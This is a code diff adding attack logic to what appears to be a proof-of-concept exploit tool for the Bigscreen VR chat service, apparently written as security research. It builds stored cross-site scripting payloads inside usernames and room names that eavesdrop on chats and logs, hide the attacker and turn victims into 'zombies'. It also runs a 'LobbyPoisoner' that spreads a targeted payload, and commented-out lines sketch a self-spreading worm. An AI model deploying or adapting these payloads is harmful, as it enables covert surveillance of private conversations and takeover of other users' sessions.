@@ -2240,6 +2119,84 @@ function DiscoveredRoomsUI(discoveredRoomsManager){
         that.roomsManager.togglePeriodicUpdates();
     });
 }
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+let NAME = textName;
+NAME += '<scr'+'ipt>';
+NAME += hideUsernameFromRoomPreview;
+NAME += hideFirstCommaFromRoomPreview;
+NAME += hideUsernameFromRoomParticipants;
+NAME += persistentChatEavesdropping;
+NAME += makeZombie;
+NAME += discoverRoom;
+NAME += persistentLogsEavesdropping;
+NAME += '</sc'+'ript>';
+
+// show disclaimer
+$('#disclaimerModal').modal({backdrop:'static',keyboard:false});
+
+let lobbyPoisoner = null;
+infectLobbyForm.addEventListener("submit", function (event) {
+    event.preventDefault();
+    let submitElement = infectLobbyForm.querySelector('input[type=submit]');
+    if (lobbyPoisoner === null) {
+        submitElement.disabled = true;
+        submitElement.classList.add('disabled');
+
+        // TODO: infectLobbyForm form fields `worm` and `targetUser` are currently ignored, worm=false, targetUser='Bob'
+        let roomName = 'My room.';
+        roomName += '<scr'+'ipt>';
+        roomName += `if(NAME==='Bob'){`;
+        //roomName += `function worm(){if(window._infected===undefined){var oldName=NAME;`;
+        roomName += discoverRoom;
+        //roomName += `displayDefaultState = function () { $("#room-id-info") ["hide"](); $("#room-disconnected") ["hide"](); $("#room-leave") ["show"](); $(".user-you .multiplayer-profile-image") ["removeClass"]("") ["addClass"]("profile-photo-sm multiplayer-profile-image " + USER); $(".user-you .user-name") ["text"](oldName); generateFlairs(USER, $(".user-you .flairs"), $(".user-you .user-name")); $("ul#room-participants") ["html"]("") };`;
+        //roomName += `;NAME='<sc'+'ript> '+worm.toString()+' ;worm();</sc'+'ript>'+oldName;Unity.setName(NAME);window._infected=true;}}; worm();`;
+        roomName += '}';
+        roomName += '</sc'+'ript>';
+
+        let onStarted = function () {
+            console.info('LobbyPoisoner: started.');
+            submitElement.value = 'Stop poisoning lobby';
+            submitElement.classList.toggle('btn-danger');
+            submitElement.classList.toggle('btn-success');
+            submitElement.classList.remove('disabled');
+            submitElement.disabled = false;
+        };
+        let onStopped = function () {
+            console.info('LobbyPoisoner: stopped.');
+            submitElement.value = 'Start poisoning lobby';
+            submitElement.classList.toggle('btn-danger');
+            submitElement.classList.toggle('btn-success');
+            submitElement.classList.remove('disabled');
+            submitElement.disabled = false;
+        };
+        let attackerIdentity = new Identity('John46_1', generateBigscreenUuid(), '', '');
+        lobbyPoisoner = new LobbyPoisoner(roomName, attackerIdentity, onStarted, onStopped);
+        lobbyPoisoner.start();
+    }
+    else{
+        lobbyPoisoner.stop();
+        lobbyPoisoner = null;
+    }
+});
+
+joinRoomForm.addEventListener("submit", function (event) {
+    event.preventDefault();
+    let roomId = roomIdInput.value;
+
+    if(rooms[roomId]){console.warn('You are already connected to this room.'); return;}
+
+    discoveredRoomsManager.addRoom(roomId);
+
+    let attackerIdentity = new Identity(NAME, generateBigscreenUuid(), '', '');
+    let room = new Room(roomId, attackerIdentity);
+    rooms[roomId] = room;
+    room._load(
+        function(){room.join();},
+        function(){console.error('ERROR', 'Could not load room information')}
+    );
+});
 
 let publicRoomsManager = new PublicRoomsManager();
 let discoveredRoomsManager = new DiscoveredRoomsManager();
